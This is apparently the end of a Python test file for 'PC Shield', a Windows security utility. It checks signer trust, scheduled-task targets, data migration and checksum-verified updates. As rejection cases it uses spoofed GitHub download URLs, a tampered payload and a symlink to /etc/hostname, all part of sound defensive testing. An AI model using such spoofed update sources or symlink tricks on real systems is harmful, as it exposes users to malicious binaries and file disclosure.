    assert trust.is_trusted("Intel(R) Corporation", "Valid") and trust.is_trusted("Microsoft Windows", "Valid")
    assert not trust.is_trusted("Intelligent Tools Ltd", "Valid")
    assert not trust.is_trusted("Valveworks LLC", "Valid")
    assert not trust.is_trusted("Riot Games, Inc.", "NotSigned")


def _frozen(exe):
    real = (getattr(sys, "frozen", None), sys.executable)
    sys.frozen, sys.executable = True, exe
    return real


def _unfreeze(real):
    if real[0] is None:
        del sys.frozen
    else:
        sys.frozen = real[0]
    sys.executable = real[1]


@test
def tasks_run_protected_copy_not_downloads():
    d = tempfile.mkdtemp()
    dl = os.path.join(d, "Downloads", "PCShield.exe"); os.makedirs(os.path.dirname(dl)); open(dl, "wb").write(b"v13")
    real_dir, real_exe = install.INSTALL_DIR, install.INSTALL_EXE
    install.INSTALL_DIR = os.path.join(d, "Program Files", "PC Shield"); install.INSTALL_EXE = os.path.join(install.INSTALL_DIR, "PCShield.exe")
    fr = _frozen(dl)
    try:
        PS_RULES.append(("Register-ScheduledTask", ("ok", "", 0)))
        assert autostart.set_enabled(True)["ok"]
        cmd = [c for c in PS_LOG if "Register-ScheduledTask" in c][-1]
        assert util.ps_quote(install.INSTALL_EXE) in cmd and dl not in cmd, cmd
        assert open(install.INSTALL_EXE, "rb").read() == b"v13"
        assert "WindowsIdentity]::GetCurrent().Name" in cmd and "$env:USERNAME" not in cmd
        themes.register_launcher()
        assert util.ps_quote(install.INSTALL_EXE) in [c for c in PS_LOG if "PC Shield Launcher" in c and "Register" in c][-1]
        scanner.set_schedule("quick", True, "daily", "SUN", "12:30")
        assert util.ps_quote(install.INSTALL_EXE) in [c for c in PS_LOG if "Quick Scan" in c and "Register" in c][-1]
    finally:
        _unfreeze(fr)
        install.INSTALL_DIR, install.INSTALL_EXE = real_dir, real_exe
        shutil.rmtree(d)


@test
def old_tasks_moved_to_protected_copy():
    d = tempfile.mkdtemp()
    dl = os.path.join(d, "PCShield.exe"); open(dl, "wb").write(b"x")
    real_dir, real_exe = install.INSTALL_DIR, install.INSTALL_EXE
    install.INSTALL_DIR = os.path.join(d, "pf"); install.INSTALL_EXE = os.path.join(install.INSTALL_DIR, "PCShield.exe")
    fr = _frozen(dl)
    try:
        PS_RULES.append(("Set-ScheduledTask", ("PC Shield\nPC Shield Launcher\n", "", 0)))
        PS_RULES.append(("Get-ScheduledTask", ("PC Shield\n", "", 0)))
        assert install.retarget_tasks() == ["PC Shield", "PC Shield Launcher"]
        assert os.path.isfile(install.INSTALL_EXE)
        PS_RULES.clear(); PS_LOG.clear()
        assert install.retarget_tasks() == [] and not any("Set-ScheduledTask" in c for c in PS_LOG)  # nothing stale
    finally:
        _unfreeze(fr)
        install.INSTALL_DIR, install.INSTALL_EXE = real_dir, real_exe
        shutil.rmtree(d)


@test
def old_data_moved_and_keys_removed():
    old = util.OLD_DATA_DIR
    for sub in ("reports", "vpn"):
        os.makedirs(os.path.join(old, sub), exist_ok=True)
    open(os.path.join(old, "settings.json"), "w").write('{"theme": "james"}')
    open(os.path.join(old, "reports", "r9.json"), "w").write("{}")
    open(os.path.join(old, "vpn", "home.conf"), "w").write("[Interface]\nPrivateKey=k\n[Peer]\n")
    open(os.path.join(old, "vpn", "notes.txt"), "w").write("ignored")
    os.symlink("/etc/hostname", os.path.join(old, "reports", "link.json"))
    for f in (util.SETTINGS_FILE, os.path.join(util.REPORT_DIR, "r9.json"), os.path.join(util.VPN_DIR, "home.conf")):
        if os.path.exists(f):
            os.remove(f)
    util.save_setting("migrated_from_localappdata", False)
    os.remove(util.SETTINGS_FILE)
    install.migrate_old_data()
    assert util.load_settings().get("theme") == "james" and util.load_settings().get("migrated_from_localappdata")
    assert os.path.isfile(os.path.join(util.REPORT_DIR, "r9.json")) and os.path.isfile(os.path.join(util.VPN_DIR, "home.conf"))
    assert not os.path.exists(os.path.join(util.REPORT_DIR, "link.json")) and not os.path.exists(os.path.join(util.VPN_DIR, "notes.txt"))
    assert not os.path.exists(os.path.join(old, "vpn", "home.conf")), "private key left in the per-user folder"
    assert install.migrate_old_data() == 0  # only once
    shutil.rmtree(old)


@test
def version_compare():
    assert updater.newer("1.10.0", "1.9.9") and updater.newer("v2.0", "1.3.0")
    assert not updater.newer("1.3.0", "1.3.0") and not updater.newer("1.2.9", "1.3.0") and not updater.newer("junk", "1.3.0")


def _release(tag="v1.4.0", digest="sha256:" + "ab" * 32, url=None, size=5):
    return {"tag_name": tag, "name": "PC Shield " + tag, "body": "notes", "html_url": "https://github.com/Ynzie/PCShield/releases/tag/" + tag,
            "assets": [{"name": "PCShield.exe", "size": size, "digest": digest,
                        "browser_download_url": url or f"https://github.com/Ynzie/PCShield/releases/download/{tag}/PCShield.exe"}]}


@test
def update_check_and_asset_rules():
    real = updater._get_json
    try:
        updater._get_json = lambda url, timeout=15: (404, {})
        r = updater.check(force=True)
        assert r["ok"] and not r["available"] and "No releases" in r["message"]
        updater._get_json = lambda url, timeout=15: (200, _release())
        r = updater.check(force=True)
        assert r["available"] and r["latest"] == "1.4.0" and not r["can_install"]  # not frozen -> source install
        calls = []
        updater._get_json = lambda url, timeout=15: calls.append(url) or (200, _release("v9.9.9"))
        assert updater.check()["latest"] == "1.4.0" and not calls  # cached for a day
    finally:
        updater._get_json = real
    assert updater._asset_ok("https://github.com/Ynzie/PCShield/releases/download/v1.4.0/PCShield.exe")
    for bad in ("http://github.com/Ynzie/PCShield/releases/download/v1/PCShield.exe",
                "https://github.com/evil/PCShield/releases/download/v1/PCShield.exe",
                "https://github.com.evil.io/Ynzie/PCShield/releases/download/v1/PCShield.exe",
                "https://github.com/Ynzie/PCShield/releases/download/v1/Other.exe"):
        assert not updater._asset_ok(bad), bad
    assert updater.parse_release(_release(digest="md5:abc"))["sha256"] == ""


def _run_install(data, payload):
    d = tempfile.mkdtemp()
    exe = os.path.join(d, "PCShield.exe"); open(exe, "wb").write(b"old")
    fr = _frozen(exe)
    real = (updater._get_json, updater._download, install.INSTALL_EXE)
    install.INSTALL_EXE = os.path.join(d, "nope", "PCShield.exe")
    restarted = []

    def fake_download(url, dest, size):
        open(dest, "wb").write(payload)
        import hashlib
        return hashlib.sha256(payload).hexdigest()
    updater._get_json = lambda url, timeout=15: (200, data)
    updater._download = fake_download
    try:
        updater.start_install(on_done=restarted.append)
        for _ in range(100):
            if not updater.state()["running"]:
                break
            time.sleep(0.05)
        return updater.state(), open(exe, "rb").read(), restarted
    finally:
        _unfreeze(fr)
        updater._get_json, updater._download, install.INSTALL_EXE = real
        shutil.rmtree(d)


@test
def update_installs_only_matching_checksum():
    import hashlib
    good = b"new build"
    st, body, restarted = _run_install(_release(digest="sha256:" + hashlib.sha256(good).hexdigest(), size=len(good)), good)
    assert not st["error"] and st["finished"] and body == good and restarted, st
    st, body, restarted = _run_install(_release(digest="sha256:" + "00" * 32), b"tampered")
    assert "checksum" in st["error"] and body == b"old" and not restarted, st
    st, body, restarted = _run_install(_release(digest=""), good)
    assert "checksum" in st["error"] and body == b"old", st
    st, body, _ = _run_install(_release(url="https://example.com/PCShield.exe"), good)
    assert "no PCShield.exe" in st["error"] and body == b"old", st


@test
def replace_running_exe_by_renaming():
    d = tempfile.mkdtemp()
    src, dst = os.path.join(d, "new.exe"), os.path.join(d, "PCShield.exe")
    open(src, "wb").write(b"2"); open(dst, "wb").write(b"1")
    real = install.os.replace
    calls = []

    def locked(a, b):  # the first replace onto the running exe fails like on Windows
        calls.append((a, b))
        if b == dst and a.endswith(".new") and len(calls) == 1:
            raise PermissionError("in use")
        return real(a, b)
    install.os.replace = locked
    try:
        install.replace_file(src, dst)
    finally:
        install.os.replace = real
    assert open(dst, "rb").read() == b"2" and any(n.endswith(".old") for n in os.listdir(d))
    shutil.rmtree(d)

for status, name, tb in RESULTS:
    print(f"{status}  {name}")
    if tb:
        print("      " + tb.strip().replace("\n", "\n      "))
print(f"\n{sum(1 for r in RESULTS if r[0] == 'PASS')}/{len(RESULTS)} passed")
sys.exit(0 if all(r[0] == "PASS" for r in RESULTS) else 1)
